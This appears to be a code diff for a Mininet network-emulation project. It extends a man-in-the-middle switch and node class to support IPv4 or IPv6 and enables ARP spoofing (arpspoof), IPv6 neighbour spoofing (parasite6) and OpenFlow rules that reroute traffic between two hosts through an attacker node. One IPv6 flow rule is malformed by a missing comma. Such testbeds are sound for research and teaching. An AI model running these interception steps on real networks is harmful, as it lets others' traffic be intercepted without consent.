@@ -209,81 +209,89 @@ class MiMOVSSwitch( OVSSwitch ):
            batch: enable batch startup (False)"""
         OVSSwitch.__init__( self, name, **params )
 
-    def add_mim_flows( self, source, target, mim ):
+    def add_mim_flows( self, source, target, mim, use_ipv6=True ):
         """Sets the flows for a MiM switch.
         :param source: the source (e.g. se1)
         :param target: the target (e.g. ev1)
-        :param mim: the MiM node (e.g. mim)"""
-        # BEWARE THIS IS IPV4
+        :param mim: the MiM node (e.g. mim)
+        :param use_ipv6: choose ipv6 or ipv4 (default: true)"""
 
-        # CLI EXAMPLE
-        # sh ovs-ofctl add-flow s1 dl_src=00:00:00:00:00:01,dl_dst=00:00:00:00:00:03,actions=mod_nw_dst:10.0.0.3,output:3
-        # sh ovs-ofctl add-flow s1 dl_src=00:00:00:00:00:03,dl_dst=00:00:00:00:00:01,actions=mod_nw_src:10.0.0.2,output:1
-        # sh ovs-ofctl add-flow s1 dl_type=0x806,nw_proto=1,actions=flood
+        if use_ipv6:
+            # TODO: should be addded to mininet node itself in the future
+            get_ipv6 = "ifconfig %s | grep inet6 | grep -o -P '(?<=inet6 ).*(?= prefixlen)'"
+            sourceIPV6 = source.cmd(get_ipv6 % (source.intf().name)).rstrip()
+            targetIPV6 = target.cmd(get_ipv6 % (target.intf().name)).rstrip()
+            mimIPV6 = mim.cmd(get_ipv6 % (mim.intf().name)).rstrip()
 
-        # TODO: should be addded to mininet node itself in the future
-        get_ipv6 = "ifconfig %s | grep inet6 | grep -o -P '(?<=inet6 ).*(?= prefixlen)'"
-        sourceIPV6 = source.cmd(get_ipv6 % (source.intf().name)).rstrip()
-        targetIPV6 = target.cmd(get_ipv6 % (target.intf().name)).rstrip()
-        mimIPV6 = mim.cmd(get_ipv6 % (mim.intf().name)).rstrip()
-
-        # DOES NOT WORK
+        # TODO: DOES NOT WORK, alternative? environment vars?
         # save ipv6 of source and target in /etc/hosts for easy access to terminal
         # source.cmd("echo '%s" % targetIPV6 +"%"+"%s     ev1' > ~/.hosts" % source.intf().name)
         # source.cmd("export HOSTALIASES=~/.hosts")
         
         ### IPV4
+        if not use_ipv6:
+            # CLI EXAMPLE
+            # sh ovs-ofctl add-flow s1 dl_src=00:00:00:00:00:01,dl_dst=00:00:00:00:00:03,actions=mod_nw_dst:10.0.0.3,output:3
+            # sh ovs-ofctl add-flow s1 dl_src=00:00:00:00:00:03,dl_dst=00:00:00:00:00:01,actions=mod_nw_src:10.0.0.2,output:1
+            # sh ovs-ofctl add-flow s1 dl_type=0x806,nw_proto=1,actions=flood
 
-        #  PART 1 fake communication with source : IPV4 ONLY
-        # # mac 10.0.0.2 is already linked to (3) by mim arpspoof
-        # # malicious node changes the ip
-        # # source -> mim, mim
-        # self.cmd("ovs-ofctl", "add-flow", "s1", "dl_src=%s,dl_dst=%s,actions=mod_nw_dst:%s,output:3" % (source.MAC(), mim.MAC(), mim.IP()))
-        # # mim -> target, source
-        # self.cmd("ovs-ofctl", "add-flow", "s1", "dl_src=%s,dl_dst=%s,actions=mod_nw_src:%s,output:1" % (mim.MAC(), source.MAC(), target.IP()))
+            #  PART 1 fake communication with source : IPV4 ONLY
+            # mac 10.0.0.2 is already linked to (3) by mim arpspoof
+            # malicious node changes the ip
+            # source -> mim, mim
+            self.cmd("ovs-ofctl", "add-flow", "s1", "dl_src=%s,dl_dst=%s,actions=mod_nw_dst:%s,output:3" % (source.MAC(), mim.MAC(), mim.IP()))
+            # mim -> target, source
+            self.cmd("ovs-ofctl", "add-flow", "s1", "dl_src=%s,dl_dst=%s,actions=mod_nw_src:%s,output:1" % (mim.MAC(), source.MAC(), target.IP()))
 
-        # # PART 2 fake communication with target : IPV4 ONLY
-        # # source -> mim, mim
-        # self.cmd("ovs-ofctl", "add-flow", "s1", "dl_src=%s,dl_dst=%s,actions=mod_nw_dst:%s,output:3" % (target.MAC(), mim.MAC(), mim.IP()))
-        # # mim -> target, source
-        # self.cmd("ovs-ofctl", "add-flow", "s1", "dl_src=%s,dl_dst=%s,actions=mod_nw_src:%s,output:2" % (mim.MAC(), target.MAC(), source.IP()))
-        
-        # flood the arp relys to all nodes who requested them
-        # self.cmd("ovs-ofctl", "add-flow", "s1", "dl_type=0x806,nw_proto=1,actions=flood")
-
+            # PART 2 fake communication with target : IPV4 ONLY
+            # source -> mim, mim
+            self.cmd("ovs-ofctl", "add-flow", "s1", "dl_src=%s,dl_dst=%s,actions=mod_nw_dst:%s,output:3" % (target.MAC(), mim.MAC(), mim.IP()))
+            # mim -> target, source
+            self.cmd("ovs-ofctl", "add-flow", "s1", "dl_src=%s,dl_dst=%s,actions=mod_nw_src:%s,output:2" % (mim.MAC(), target.MAC(), source.IP()))
+            
+            # flood the arp relys to all nodes who requested them
+            self.cmd("ovs-ofctl", "add-flow", "s1", "dl_type=0x806,nw_proto=1,actions=flood")
         ### IPV6
+        else:
+            # ICMPv6 messages are sent in the network to understand the mac addresses of the others
 
-        # PART 1 fake communication with source : IPV6 ONLY (0x86dd)
-        # direction: source -> any
-        # action: change ip to mim and send flow to mim
-        self.cmd("ovs-ofctl", "add-flow", "s1", "dl_type=0x86dd,ipv6_src=%s,actions=set_field:%s-\>ipv6_dst,output:3" % (sourceIPV6, mimIPV6))
-        # messages generated by parasite6 need redirection to source
-        # direction: target (generated by mim) -> source
-        # action: send flow to source
-        self.cmd("ovs-ofctl", "add-flow", "s1", "dl_type=0x86dd,ipv6_dst=%s,actions=set_field:%s-\>ipv6_src,output:1" % (sourceIPV6, targetIPV6))
+            # PART 1 fake communication with source : IPV6 ONLY (0x86dd)
+            # direction: source -> any
+            # action: change ip to mim and send flow to mim
+            self.cmd("ovs-ofctl", "add-flow", "s1", "dl_type=0x86dd,ipv6_src=%s,in_port=1,actions=set_field:%s-\>ipv6_dst,output:3" % (sourceIPV6, mimIPV6))
+            # messages generated by parasite6 need redirection to source
+            # direction: target (generated by mim) -> source
+            # action: send flow to source
+            self.cmd("ovs-ofctl", "add-flow", "s1", "dl_type=0x86dd,ipv6_dst=%s,in_port=3,actions=set_field:%s-\>ipv6_src,output:1" % (sourceIPV6, targetIPV6))
 
-        
+            # PART 2 fake communication with target : IPV6 ONLY (0x86dd)
+            # direction: target -> any
+            # action: change ip to mim and send flow to mim
+            self.cmd("ovs-ofctl", "add-flow", "s1", "dl_type=0x86dd,ipv6_src=%s,in_port=2,actions=set_field:%s-\>ipv6_dst,output:3" % (targetIPV6, mimIPV6))
+            # # messages generated by parasite6 need redirection to source
+            # # direction: source (generated by mim) -> target
+            # # action: send flow to target
+            self.cmd("ovs-ofctl", "add-flow", "s1", "dl_type=0x86dd,ipv6_dst=%s,in_port=3actions=set_field:%s-\>ipv6_src,output:2" % (targetIPV6, sourceIPV6))
+
+            
         print(self.cmd("ovs-ofctl", "dump-flows", "s1"))
 
 class MiMNode( Node ):
+    """Basic node class for man in the middle."""
     def __init__( self, name, source=None, inNamespace=True, **params ):
         Node.__init__(  self, name, inNamespace=True, **params  )
 
-    def __exit__( self ):
-        self.stop_receive = True
-
-    def start_arpspoof( self, source, target ):
-
-        # IPV6 SPOOFING
-        self.cmd('echo 1 > /proc/sys/net/ipv6/conf/all/forwarding')
-        self.cmd('ip6tables -I OUTPUT -p icmpv6 --icmpv6-type redirect -j DROP')
-        self.cmd('parasite6 %s' % self.intf().name, "2>/dev/null 1>/dev/null &")
-
-        # CLI EXAMPLE
+    def start_spoof( self, source, target, use_ipv6=True ):
+        # IPV4
+        # cli example
         # arpspoof -i h3-eth0 -c own -t 10.0.0.1 10.0.0.2 2>/dev/null 1>/dev/null & # send arp reply
-
-        # # fake MAC in arp table of source
-        # self.cmd("arpspoof", "-i %s" % self.intf().name, "-t %s" % source.IP(), "%s" % target.IP(), " 2>/dev/null 1>/dev/null &")
-        # # fake MAC in arp table of target
-        # self.cmd("arpspoof", "-i %s" % self.intf().name, "-t %s" % target.IP(), "%s" % source.IP(), " 2>/dev/null 1>/dev/null &")
-
+        if not use_ipv6:
+            # fake MAC in arp table of source
+            self.cmd("arpspoof", "-i %s" % self.intf().name, "-t %s" % source.IP(), "%s" % target.IP(), " 2>/dev/null 1>/dev/null &")
+            # fake MAC in arp table of target
+            self.cmd("arpspoof", "-i %s" % self.intf().name, "-t %s" % target.IP(), "%s" % source.IP(), " 2>/dev/null 1>/dev/null &")
+        # IPV6
+        else:
+            self.cmd('echo 1 > /proc/sys/net/ipv6/conf/all/forwarding')
+            self.cmd('ip6tables -I OUTPUT -p icmpv6 --icmpv6-type redirect -j DROP')
+            self.cmd('parasite6 %s' % self.intf().name, "2>/dev/null 1>/dev/null &")
